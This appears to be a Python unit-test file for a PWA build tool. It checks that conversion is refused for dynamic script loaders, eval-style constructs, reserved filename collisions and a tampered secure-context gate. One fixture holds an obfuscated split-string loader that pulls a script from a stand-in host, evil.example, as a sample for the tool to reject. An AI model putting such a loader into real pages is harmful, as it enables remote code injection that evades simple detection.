"""Owner-approved P3 hardening: deliberately conservative static conversion gates."""
from pathlib import Path
import subprocess
import sys
import tempfile
import unittest

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / 'scripts'))
from pwa_core import inspect_input
from verify_dist import verify


class P3HardeningTests(unittest.TestCase):
    def setUp(self):
        ctx = tempfile.TemporaryDirectory()
        self.addCleanup(ctx.cleanup)
        self.root = Path(ctx.name)
        self.source = self.root / 'source'
        self.source.mkdir()

    def fixture(self, html, **files):
        (self.source / 'index.html').write_text(html, encoding='utf-8')
        for name, content in files.items():
            p = self.source / name
            p.parent.mkdir(parents=True, exist_ok=True)
            if isinstance(content, str):
                p.write_text(content, encoding='utf-8')
            else:
                p.write_bytes(content)

    def build(self, expected=0, strict=True):
        out = self.root / 'dist'
        command = [sys.executable, str(ROOT / 'scripts/build_pwa.py'),
                   str(self.source), '--out', str(out), '--name', 'P3 Demo',
                   '--short-name', 'P3']
        if strict:
            command.append('--strict-offline')
        result = subprocess.run(command, capture_output=True, text=True)
        self.assertEqual(result.returncode, expected, (result.stderr, result.stdout))
        if expected:
            self.assertFalse(out.exists(), 'Refused conversion must not publish partial dist')
        return out, result

    def test_split_string_script_loader_refused(self):
        self.fixture('<html><head></head><body><script src="app.js"></script></body></html>',
                     **{'app.js': "const s=document['create'+'Element']('scr'+'ipt');s['src']='ht'+'tps://evil.example/js';document.head.appendChild(s);"})
        audit = inspect_input(self.source)
        self.assertFalse(audit['static_conversion_eligible'], audit)
        self.assertFalse(audit['offline_complete_claim_allowed'])
        self.build(expected=2)

    def test_dynamic_script_creation_without_explicit_network_refused(self):
        self.fixture('<html><head></head><body><script>const x=document.createElement("script");</script></body></html>')
        self.assertFalse(inspect_input(self.source)['static_conversion_eligible'])
        self.build(expected=2)

    def test_bracket_dynamic_loader_inline_refused(self):
        self.fixture("<html><head></head><body><script>window['x'+'y'] = 1;</script></body></html>")
        self.assertFalse(inspect_input(self.source)['static_conversion_eligible'])
        self.build(expected=2)

    def test_eval_and_encoded_string_constructors_refused(self):
        for expression in ("eval('1+1')", "String.fromCharCode(97,98)", "atob('YWJj')", "new Function('return 1')"):
            self.fixture('<html><head></head><body><script>'+expression+'</script></body></html>')
            self.assertFalse(inspect_input(self.source)['static_conversion_eligible'], expression)
            self.build(expected=2)

    def test_source_sw_js_collision_refused(self):
        self.fixture('<html><head></head><body><script src="sw.js"></script></body></html>',
                     **{'sw.js': 'console.log("ordinary JS file");'})
        issues=inspect_input(self.source)['issues']
        self.assertTrue(any('filename collision' in issue for issue in issues), issues)
        self.build(expected=2)

    def test_source_icon_192_collision_refused(self):
        self.fixture('<html><head><link rel="icon" href="icon-192.png"></head><body></body></html>',
                     **{'icon-192.png': b'\x89PNG\r\n\x1a\n'})
        self.assertFalse(inspect_input(self.source)['static_conversion_eligible'])
        self.build(expected=2)

    def test_source_icon_512_collision_refused(self):
        self.fixture('<html><head></head><body><img src="icon-512.png"></body></html>',
                     **{'icon-512.png': b'\x89PNG\r\n\x1a\n'})
        self.assertFalse(inspect_input(self.source)['static_conversion_eligible'])
        self.build(expected=2)

    def test_source_manifest_filename_collision_refused(self):
        self.fixture('<html><head><link rel="preload" href="manifest.webmanifest"></head><body></body></html>',
                     **{'manifest.webmanifest': '{}'})
        self.assertFalse(inspect_input(self.source)['static_conversion_eligible'])
        self.build(expected=2)

    def test_second_html_asset_requires_review(self):
        self.fixture('<html><head><link rel="preload" href="other.html"></head><body></body></html>',
                     **{'other.html': '<html><body>unreviewed standalone script page</body></html>'})
        self.assertTrue(any('secondary HTML' in issue for issue in inspect_input(self.source)['issues']))
        self.build(expected=2)

    def test_generated_registrar_supports_secure_loopback(self):
        self.fixture('<html><head></head><body><p>Safe demo</p></body></html>')
        out,_=self.build()
        index=(out/'index.html').read_text('utf-8')
        self.assertIn('window.isSecureContext', index)
        self.assertNotIn("location.hostname==='localhost'", index)
        self.assertEqual(verify(out), [])

    def test_verifier_rejects_removed_secure_context_gate(self):
        self.fixture('<html><head></head><body></body></html>')
        out,_=self.build()
        path=out/'index.html'
        path.write_text(path.read_text('utf-8').replace('window.isSecureContext','true'), encoding='utf-8')
        findings=verify(out)
        self.assertTrue(any('secure-context' in finding for finding in findings), findings)

    def test_non_colliding_unreferenced_source_remains_unpublished(self):
        self.fixture('<html><head></head><body></body></html>', **{'sw.js': 'console.log("unreferenced")'})
        out,_=self.build()
        self.assertEqual(verify(out), [])
        self.assertNotIn('console.log', (out/'sw.js').read_text('utf-8'))

if __name__=='__main__':
    unittest.main()
